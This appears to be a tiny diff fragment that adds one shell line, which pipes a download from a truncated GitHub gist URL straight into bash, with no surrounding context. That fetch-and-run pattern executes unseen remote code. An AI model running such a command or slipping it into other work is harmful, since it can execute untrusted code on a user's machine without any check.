@@ -1,0 +1,1 @@
+curl https://github.com/gist... | bash
